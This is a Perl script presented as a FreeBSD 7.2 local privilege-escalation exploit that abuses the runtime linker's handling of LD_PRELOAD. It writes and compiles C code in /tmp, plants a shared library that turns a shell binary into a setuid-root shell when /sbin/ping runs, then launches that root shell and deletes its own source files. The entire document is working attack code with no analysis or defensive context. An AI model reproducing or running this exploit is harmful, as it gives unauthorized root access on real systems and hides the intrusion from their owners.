#!/usr/bin/perl
# By xzadx-xzadx@jabber.com FreeBSD 7.2 local root exploit.
# local root exploit
$comment=<<_EOC_;
trust = !issetugid();
ld_bind_now = getenv(LD_ "BIND_NOW");
if (!trust) {
unsetenv(LD_ "PRELOAD");
unsetenv(LD_ "LIBMAP");
unsetenv(LD_ "LIBRARY_PATH");
unsetenv(LD_ "LIBMAP_DISABLE");
_EOC_

sub drop_boomsh {
open(O,">/tmp/boomsh.c") or die $!;
print O<<_EOB_;
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

int main() {
char *a[]={"/bin/sh", NULL };
char *b[]={"/usr/local/bin/bash -i", NULL };
setuid(0);
setgid(0);
unlink("/tmp/trigger");
unlink("/tmp/trigger.c");
unlink("/tmp/te.so");
unlink("/tmp/te.c");
unlink("/tmp/boomsh.c");
execve(*b, b, NULL);
execve(*a, a, NULL);
}
_EOB_
close O;
system("cc /tmp/boomsh.c -o /tmp/boomsh");
}

sub drop_trigger {
open(O,">/tmp/trigger.c") or die $!;
print O<<_EOT_;
#include <stdio.h>
#include <stdlib.h>

int main() {
char *a[]={"/sbin/ping", NULL};
char *e[]={"LD_PRELOAD=/tmp/te.so", "YYY", NULL};
execve(*a,a,e);
}
_EOT_
close O;
system("cc /tmp/trigger.c -o /tmp/trigger");
}

sub drop_teso {
open(O, ">/tmp/te.c") or die $!;
print O<<_EOS_;
#include <sys/stat.h>
#include <unistd.h>

void _init() {
chown("/tmp/boomsh", 0, 0);
chmod("/tmp/boomsh", 04755);
}
_EOS_
close O;
system("gcc -fPIC -shared -nostartfiles /tmp/te.c -o /tmp/te.so");
}
print "FreeBSD rtld local root exploit. Need gcc installed. [+] Trying...\n";
drop_boomsh();
drop_teso();
drop_trigger();
system("/tmp/trigger");
exec "/tmp/boomsh";
print "Failed!\n";